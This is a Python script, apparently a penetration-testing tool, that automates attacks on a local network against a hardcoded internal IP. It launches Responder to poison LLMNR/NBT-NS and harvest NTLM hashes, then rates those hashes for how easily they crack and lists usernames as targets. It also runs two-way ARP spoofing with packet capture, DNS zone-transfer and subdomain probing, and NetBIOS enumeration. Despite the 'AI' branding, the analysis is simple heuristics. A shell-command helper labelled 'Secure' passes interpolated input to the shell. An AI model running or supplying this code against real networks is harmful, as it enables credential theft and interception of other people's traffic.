#!/usr/bin/env python3

import subprocess
import json
import os
import time
import threading
import re
from datetime import datetime
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from scapy.all import ARP, Ether, srp, sniff
import netifaces

class NetworkAnalyzer:
    def __init__(self):
        self.traffic_patterns = {
            'windows_traffic': ['SMB', 'NetBIOS', 'RPC', 'LLMNR'],
            'linux_traffic': ['SSH', 'NFS', 'Rsync', 'Avahi'],
            'iot_traffic': ['MQTT', 'UPnP', 'mDNS', 'CoAP'],
            'suspicious': ['NTLM', 'Kerberos', 'LDAP', 'DNS-Tunnel']
        }
        
    def analyze_captured_hashes(self, hashes):
        """AI analysis of captured hashes"""
        analysis = {
            'total_hashes': len(hashes),
            'hash_types': {},
            'potential_targets': [],
            'crackability_score': 0
        }
        
        for hash_line in hashes:
            # Analyze hash type
            if 'NTLMv2' in hash_line:
                analysis['hash_types']['NTLMv2'] = analysis['hash_types'].get('NTLMv2', 0) + 1
            elif 'NTLMv1' in hash_line:
                analysis['hash_types']['NTLMv1'] = analysis['hash_types'].get('NTLMv1', 0) + 1
            
            # Extract usernames and targets
            username_match = re.search(r'(\w+)\$*:', hash_line)
            if username_match:
                username = username_match.group(1)
                if username not in analysis['potential_targets']:
                    analysis['potential_targets'].append(username)
        
        # Calculate crackability score
        if analysis['hash_types'].get('NTLMv1', 0) > 0:
            analysis['crackability_score'] += 30
        if analysis['hash_types'].get('NTLMv2', 0) > 0:
            analysis['crackability_score'] += 10
        if analysis['total_hashes'] > 5:
            analysis['crackability_score'] += 20
        
        analysis['crackability_score'] = min(100, analysis['crackability_score'])
        
        return analysis
    
    def predict_network_topology(self, live_hosts, gateway):
        """Predict network topology using ML"""
        features = []
        host_info = []
        
        for host in live_hosts:
            # Create feature vector
            feature_vec = [
                1 if host['ip'] == gateway else 0,  # is_gateway
                len(host.get('open_ports', [])),     # open_ports_count
                1 if any(p in [80, 443, 8080] for p in host.get('open_ports', [])) else 0,  # has_web
                1 if any(p in [21, 22, 23] for p in host.get('open_ports', [])) else 0,     # has_remote
            ]
            features.append(feature_vec)
            host_info.append(host)
        
        if len(features) > 2:
            # Simple clustering for topology prediction
            from sklearn.cluster import KMeans
            kmeans = KMeans(n_clusters=min(3, len(features)), random_state=42)
            clusters = kmeans.fit_predict(features)
            
            topology = {
                'gateway': gateway,
                'client_devices': [],
                'servers': [],
                'network_devices': []
            }
            
            for i, cluster in enumerate(clusters):
                host = host_info[i]
                if host['ip'] == gateway:
                    topology['gateway'] = host
                elif cluster == 0:  # Assume cluster 0 are clients
                    topology['client_devices'].append(host)
                elif cluster == 1:  # Assume cluster 1 are servers
                    topology['servers'].append(host)
                else:  # Network devices
                    topology['network_devices'].append(host)
            
            return topology
        
        return None

# Global analyzer instance
network_analyzer = NetworkAnalyzer()

def run_command(command, timeout=120):
    """Secure command execution"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Command timed out', 'output': ''}
    except Exception as e:
        return {'success': False, 'error': str(e), 'output': ''}

def llmnr_nbtns_poisoning(interface, duration=300):
    """Intelligent LLMNR/NBT-NS poisoning with AI analysis"""
    print(f"[*] Starting AI-powered LLMNR/NBT-NS poisoning on {interface}")
    
    results = {
        'start_time': datetime.now().isoformat(),
        'interface': interface,
        'duration_seconds': duration,
        'captured_hashes': [],
        'analysis': {}
    }
    
    # Create output directory
    os.makedirs('results/responder', exist_ok=True)
    output_file = f"results/responder/responder_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    
    # Start Responder with optimized parameters
    responder_cmd = f"responder -I {interface} -dw -f 2>&1 | tee {output_file}"
    
    try:
        responder_proc = subprocess.Popen(
            responder_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )
        
        print(f"[*] Responder started. Running for {duration} seconds...")
        print("[*] AI monitoring for optimal hash capture...")
        
        # Monitor for hashes in real-time
        hash_count = 0
        start_time = time.time()
        
        while time.time() - start_time < duration:
            time.sleep(5)
            
            # Check if output file exists and read new hashes
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    content = f.read()
                    new_hashes = re.findall(r'(NTLMv.*|Hash.*)', content)
                    
                    for hash_line in new_hashes:
                        if hash_line not in results['captured_hashes']:
                            results['captured_hashes'].append(hash_line)
                            hash_count += 1
                            print(f"[+] Captured hash {hash_count}: {hash_line[:50]}...")
            
            # Adaptive duration extension if hashes are flowing
            if hash_count > 2 and time.time() - start_time < duration / 2:
                duration += 60  # Extend by 1 minute
                print(f"[*] Extending capture duration due to active hashes...")
        
        # Terminate Responder
        responder_proc.terminate()
        try:
            responder_proc.wait(timeout=10)
        except:
            responder_proc.kill()
        
        # Analyze captured hashes
        if results['captured_hashes']:
            results['analysis'] = network_analyzer.analyze_captured_hashes(results['captured_hashes'])
            print(f"[+] AI Analysis: {results['analysis']['total_hashes']} hashes, {results['analysis']['crackability_score']}% crackable")
        
        results['output_file'] = output_file
        results['hashes_captured'] = len(results['captured_hashes']) > 0
        
    except Exception as e:
        results['error'] = str(e)
        print(f"[-] LLMNR/NBT-NS poisoning failed: {e}")
    
    results['end_time'] = datetime.now().isoformat()
    return results

def arp_spoofing(target_ip, gateway, interface, duration=180):
    """Intelligent ARP spoofing with traffic analysis"""
    print(f"[*] Starting AI-enhanced ARP spoofing: {target_ip} -> {gateway}")
    
    results = {
        'start_time': datetime.now().isoformat(),
        'target': target_ip,
        'gateway': gateway,
        'interface': interface,
        'duration_seconds': duration,
        'captured_traffic': []
    }
    
    try:
        # Enable IP forwarding
        run_command('echo 1 > /proc/sys/net/ipv4/ip_forward')
        
        # Start ARP spoofing
        arp_cmd_target = f"arpspoof -i {interface} -t {target_ip} {gateway} 2>/dev/null"
        arp_cmd_gateway = f"arpspoof -i {interface} -t {gateway} {target_ip} 2>/dev/null"
        
        arp_proc1 = subprocess.Popen(arp_cmd_target, shell=True)
        arp_proc2 = subprocess.Popen(arp_cmd_gateway, shell=True)
        
        print(f"[*] ARP spoofing active. AI analyzing traffic for {duration} seconds...")
        
        # Start packet capture in background
        capture_file = f"results/arp_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
        tshark_cmd = f"tshark -i {interface} -w {capture_file} -f 'host {target_ip}' -a duration:{duration}"
        tshark_proc = subprocess.Popen(tshark_cmd, shell=True)
        
        # Wait for completion
        time.sleep(duration)
        
        # Stop processes
        arp_proc1.terminate()
        arp_proc2.terminate()
        tshark_proc.terminate()
        
        # Analyze captured traffic
        if os.path.exists(capture_file):
            analyze_cmd = f"tshark -r {capture_file} -T fields -e frame.protocols -e ip.src -e ip.dst 2>/dev/null"
            analysis = run_command(analyze_cmd)
            
            if analysis['success']:
                protocols = {}
                for line in analysis['output'].split('\n'):
                    if line.strip():
                        parts = line.split('\t')
                        if len(parts) >= 1:
                            proto = parts[0]
                            protocols[proto] = protocols.get(proto, 0) + 1
                
                results['traffic_analysis'] = {
                    'total_packets': sum(protocols.values()),
                    'protocols': protocols,
                    'capture_file': capture_file
                }
                
                print(f"[+] Captured {results['traffic_analysis']['total_packets']} packets")
        
        # Disable IP forwarding
        run_command('echo 0 > /proc/sys/net/ipv4/ip_forward')
        
        results['status'] = 'completed'
        print("[+] ARP spoofing completed")
        
    except Exception as e:
        results['error'] = str(e)
        results['status'] = 'failed'
        print(f"[-] ARP spoofing failed: {e}")
    
    results['end_time'] = datetime.now().isoformat()
    return results

def dns_enumeration(target_ip):
    """AI-enhanced DNS enumeration"""
    print(f"[*] Performing AI-powered DNS enumeration on {target_ip}")
    
    results = {}
    
    # DNS reverse lookup
    dns_reverse = run_command(f"nslookup {target_ip}")
    results['reverse_lookup'] = dns_reverse
    
    # Extract domain for further enumeration
    domain = None
    if dns_reverse['success']:
        for line in dns_reverse['output'].split('\n'):
            if 'name = ' in line:
                domain = line.split('name = ')[1].strip()
                break
    
    if domain and '.' in domain:
        results['domain'] = domain
        
        # DNS zone transfer attempt
        axfr_result = run_command(f"dig axfr {domain} @{target_ip}")
        results['dns_axfr'] = axfr_result
        
        # Comprehensive DNS queries
        dns_queries = run_command(f"dig any {domain} @{target_ip} +noall +answer")
        results['dns_any'] = dns_queries
        
        # DNS subdomain brute-force (limited)
        subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api']
        found_subdomains = []
        
        for sub in subdomains:
            result = run_command(f"dig {sub}.{domain} @{target_ip} +short")
            if result['success'] and result['output'].strip():
                found_subdomains.append(f"{sub}.{domain}")
        
        results['subdomains'] = found_subdomains
        
        # AI analysis of DNS results
        results['dns_analysis'] = analyze_dns_results(results)
    
    return results

def analyze_dns_results(dns_data):
    """AI analysis of DNS enumeration results"""
    analysis = {
        'zone_transfer_vulnerable': False,
        'subdomain_count': 0,
        'service_discovery': [],
        'security_indicators': []
    }
    
    # Check for zone transfer vulnerability
    if dns_data.get('dns_axfr', {}).get('success', False):
        if 'transfer failed' not in dns_data['dns_axfr']['output'].lower():
            analysis['zone_transfer_vulnerable'] = True
            analysis['security_indicators'].append('DNS Zone Transfer allowed')
    
    # Analyze subdomains
    analysis['subdomain_count'] = len(dns_data.get('subdomains', []))
    
    # Service discovery from subdomains
    service_keywords = {
        'web': ['www', 'api', 'app', 'web'],
        'mail': ['mail', 'smtp', 'pop', 'imap'],
        'ftp': ['ftp', 'sftp'],
        'admin': ['admin', 'control', 'manage']
    }
    
    for subdomain in dns_data.get('subdomains', []):
        for service, keywords in service_keywords.items():
            if any(keyword in subdomain for keyword in keywords):
                if service not in analysis['service_discovery']:
                    analysis['service_discovery'].append(service)
    
    return analysis

def netbios_enumeration(target_ip):
    """Advanced NetBIOS enumeration with AI analysis"""
    print(f"[*] Performing AI-enhanced NetBIOS enumeration on {target_ip}")
    
    results = {}
    
    # NBSTAT query
    nbstat_result = run_command(f"nmblookup -A {target_ip}")
    results['nbstat'] = nbstat_result
    
    # NetBIOS name query
    netbios_result = run_command(f"nmblookup -S '*'")
    results['netbios_browse'] = netbios_result
    
    # Nmap NetBIOS scripts
    vuln_check = run_command(f"nmap -sU -p 137 --script nbstat.nse {target_ip}")
    results['netbios_vuln'] = vuln_check
    
    # AI analysis of NetBIOS results
    results['netbios_analysis'] = analyze_netbios_results(results)
    
    return results

def analyze_netbios_results(netbios_data):
    """AI analysis of NetBIOS enumeration results"""
    analysis = {
        'hostname': 'Unknown',
        'domain': 'Unknown',
        'shares_found': [],
        'users_found': [],
        'vulnerability_indicators': []
    }
    
    # Extract information from nbstat
    if netbios_data['nbstat']['success']:
        output = netbios_data['nbstat']['output']
        
        # Extract hostname
        hostname_match = re.search(r'([A-Za-z0-9-]+)\s+<00>', output)
        if hostname_match:
            analysis['hostname'] = hostname_match.group(1)
        
        # Extract domain
        domain_match = re.search(r'([A-Za-z0-9-]+)\s+<1B>', output)
        if domain_match:
            analysis['domain'] = domain_match.group(1)
        
        # Look for shares
        if '<20>' in output:  # File Server Service
            analysis['vulnerability_indicators'].append('File sharing enabled')
        
        # Check for null session vulnerability patterns
        if 'UNIQUE' in output and 'U' in output:
            analysis['vulnerability_indicators'].append('NetBIOS null session possible')
    
    return analysis

def run_network_attacks(target_ip, interface='eth0'):
    """AI-powered network attack suite"""
    print(f"\n{'='*60}")
    print(f"🌐 AI NETWORK ANALYSIS - Target: {target_ip}")
    print(f"{'='*60}")
    
    results = {
        'target': target_ip,
        'interface': interface,
        'timestamp': datetime.now().isoformat(),
        'network_attacks': {},
        'ai_recommendations': []
    }
    
    # Get network information
    gateway = None
    ip_route = run_command("ip route show default")
    if ip_route['success']:
        for line in ip_route['output'].split('\n'):
            if 'default via' in line:
                parts = line.split()
                gateway = parts[2]
                break
    
    if gateway:
        print(f"[*] Detected gateway: {gateway}")
        results['gateway'] = gateway
        
        # Run AI-selected network attacks based on target analysis
        attack_plan = generate_network_attack_plan(target_ip, gateway, interface)
        print(f"[+] AI Attack Plan: {attack_plan}")
        
        # Execute selected attacks
        if 'llmnr' in attack_plan.lower():
            results['network_attacks']['llmnr_poisoning'] = llmnr_nbtns_poisoning(interface, duration=180)
        
        if 'arp' in attack_plan.lower():
            results['network_attacks']['arp_spoofing'] = arp_spoofing(target_ip, gateway, interface, duration=120)
        
        # Always run enumeration attacks
        results['network_attacks']['dns_enum'] = dns_enumeration(target_ip)
        results['network_attacks']['netbios_enum'] = netbios_enumeration(target_ip)
        
        # Generate AI recommendations
        results['ai_recommendations'] = generate_network_recommendations(results['network_attacks'])
        
        # Calculate overall network risk
        risk_score = calculate_network_risk(results['network_attacks'])
        results['overall_risk'] = {
            'score': risk_score,
            'level': get_risk_level(risk_score)
        }
    
    # Save results
    os.makedirs('results/network_attacks', exist_ok=True)
    filename = f"results/network_attacks/network_attack_{target_ip}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"[+] Network attack results saved to {filename}")
    
    # Print summary
    print(f"\n📊 Network Security Summary:")
    print(f"   Overall Risk: {results['overall_risk']['level']} ({results['overall_risk']['score']}/100)")
    
    if 'llmnr_poisoning' in results['network_attacks']:
        poisoning = results['network_attacks']['llmnr_poisoning']
        print(f"   Hashes Captured: {len(poisoning.get('captured_hashes', []))}")
    
    if results['ai_recommendations']:
        print(f"\n🤖 AI Recommendations:")
        for i, rec in enumerate(results['ai_recommendations'][:3], 1):
            print(f"   {i}. {rec['action']}")
    
    return results

def generate_network_attack_plan(target_ip, gateway, interface):
    """AI-driven network attack selection"""
    attack_plan = []
    
    # Basic network analysis to determine best attacks
    ping_result = run_command(f"ping -c 2 -W 1 {target_ip}")
    is_alive = ping_result['success']
    
    port_135 = run_command(f"nmap -p 135 {target_ip} -Pn")
    has_rpc = 'open' in port_135['output']
    
    port_445 = run_command(f"nmap -p 445 {target_ip} -Pn")
    has_smb = 'open' in port_445['output']
    
    # Select attacks based on analysis
    if is_alive:
        attack_plan.append("LLMNR/NBT-NS Poisoning")
        
        if has_smb or has_rpc:
            attack_plan.append("ARP Spoofing + Traffic Analysis")
        
        attack_plan.append("DNS Enumeration")
        attack_plan.append("NetBIOS Analysis")
    
    return " → ".join(attack_plan)

def generate_network_recommendations(attack_results):
    """Generate AI recommendations from network attack results"""
    recommendations = []
    
    # Recommendations from LLMNR poisoning
    if 'llmnr_poisoning' in attack_results:
        poisoning = attack_results['llmnr_poisoning']
        if poisoning.get('hashes_captured', False):
            recommendations.append({
                'priority': 'HIGH',
                'action': 'Disable LLMNR and NBT-NS on all Windows devices',
                'details': f"Captured {len(poisoning['captured_hashes'])} authentication hashes"
            })
    
    # Recommendations from DNS enumeration
    if 'dns_enum' in attack_results:
        dns_data = attack_results['dns_enum']
        if dns_data.get('dns_analysis', {}).get('zone_transfer_vulnerable', False):
            recommendations.append({
                'priority': 'HIGH',
                'action': 'Restrict DNS zone transfers',
                'details': 'DNS zone transfer vulnerability detected'
            })
    
    # Recommendations from NetBIOS
    if 'netbios_enum' in attack_results:
        netbios_data = attack_results['netbios_enum']
        if netbios_data.get('netbios_analysis', {}).get('vulnerability_indicators', []):
            recommendations.append({
                'priority': 'MEDIUM',
                'action': 'Review NetBIOS configuration',
                'details': 'Potential NetBIOS vulnerabilities detected'
            })
    
    return recommendations

def calculate_network_risk(attack_results):
    """Calculate overall network risk score"""
    risk_score = 0
    
    # LLMNR poisoning results
    if 'llmnr_poisoning' in attack_results:
        poisoning = attack_results['llmnr_poisoning']
        if poisoning.get('hashes_captured', False):
            risk_score += 40
            risk_score += min(30, len(poisoning['captured_hashes']) * 5)
    
    # DNS vulnerabilities
    if 'dns_enum' in attack_results:
        dns_data = attack_results['dns_enum']
        if dns_data.get('dns_analysis', {}).get('zone_transfer_vulnerable', False):
            risk_score += 25
    
    # NetBIOS vulnerabilities
    if 'netbios_enum' in attack_results:
        netbios_data = attack_results['netbios_enum']
        risk_score += len(netbios_data.get('netbios_analysis', {}).get('vulnerability_indicators', [])) * 10
    
    return min(100, risk_score)

def get_risk_level(score):
    """Convert risk score to level"""
    if score >= 70: return 'CRITICAL'
    elif score >= 50: return 'HIGH'
    elif score >= 30: return 'MEDIUM'
    elif score >= 10: return 'LOW'
    else: return 'INFO'

if __name__ == "__main__":
    target = "10.0.3.20"
    results = run_network_attacks(target)
    print(f"\nNetwork analysis completed. Overall risk: {results['overall_risk']['level']}")
